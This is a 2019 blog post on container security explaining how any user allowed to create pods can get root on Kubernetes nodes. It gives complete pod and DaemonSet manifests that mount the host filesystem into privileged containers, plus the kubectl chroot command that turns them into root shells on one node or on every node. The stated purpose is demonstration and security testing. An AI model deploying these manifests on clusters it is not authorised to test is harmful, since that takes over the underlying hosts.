---
layout: post
title: "The most pointless Kubernetes command ever"
date: 2019-04-01 19:10:39 +0100
comments: false
categories: Kubernetes
---

Coming up for 4 years ago (a lifetime in Container land) Ian Miell wrote about ["The most pointless Docker Command Ever"](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/).  This was a docker command that you could run and it would return you back as root on your host.

Far from being useless, this is one of my favourite Docker commands, either to demonstrate to people why things like mounting `docker.sock` inside a container is dangerous, or for using as part of security tests where I can create containers, and I'd like to get to the underlying host easily.

I was thinking today, I wonder what this would look like in Kubernetes...? So I create a quick pod YAML file to test.  You can use this YAML to demonstrate the risks of allowing users to create pods on your cluster, without PodSecurityPolicy setup (of course, I'm sure **all** production clusters have a PodSecurityPolicy..... right?).

The YAML is pretty simple, it basically creates a privileged container based on the `busybox` image and sets it in an endless loop, waiting for a connection, whilst also setting up the appropriate security flags to make the pod privileged, and also mounting the root directory of the underlying host into `/host`

```
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Once you've got that as a file called say "noderoot.yml" , just run `kubectl create -f noderoot.yml`
then, to get root on your Kubernetes node you just need to run

`kubectl exec -it noderootpod chroot /host` 

and Hey Presto, you'll be the `root` user on the host :)

Of course, you're thinking, "that only does one random node" and you'd be right.  To get root shells on all the nodes, what you need is a DaemonSet, which will schedule a Pod onto every node in the cluster.

The YAML for this is a little more complex, but the essence is the same

```
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootpod
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
```

Once that's run just do a `kubectl get po` to see your list of pods to choose from, and run the same `chroot /host` command on one to get that root on the host feeling...

If you've made it all the way to the bottom of this post, I'll briefly pimp out my [Mastering Container Security](https://www.blackhat.com/us-19/training/schedule/index.html#mastering-container-security-140201547156094) course, which I'm running at Black Hat USA this year, where we'll be covering this and much much more container security goodness :)
